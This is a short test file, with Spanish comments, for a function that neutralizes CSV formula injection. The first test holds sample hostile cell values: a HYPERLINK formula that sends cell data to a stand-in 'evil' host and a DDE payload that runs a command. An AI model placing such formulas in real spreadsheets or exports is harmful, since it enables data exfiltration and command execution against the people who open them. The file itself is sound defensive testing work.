import { describe, expect, it } from 'vitest';
import { neutralizeFormula } from '../src/export/export.service';

// SEC-25 (v0.1.226) — una celda del CSV no puede ejecutarse al abrirla.
describe('neutralizeFormula (inyección de fórmulas en el CSV)', () => {
    it('neutraliza lo que Excel/Sheets ejecutaría', () => {
        for (const v of ['=HYPERLINK("https://evil/?d="&A2,"Ver")', '+SUM(1,2)', '-2+3+cmd|\' /C calc\'!A0', '@SUM(A1)', '\t=1', '\r=1']) {
            expect(neutralizeFormula(v), v).toBe(`'${v}`);
        }
    });

    it('deja intactos texto común, números y teléfonos', () => {
        for (const v of ['Acme', '100', '-5', '-12.50', '+573001112233', '+57 (300) 111-2233', '', 'a=b']) {
            expect(neutralizeFormula(v), v).toBe(v);
        }
    });
});
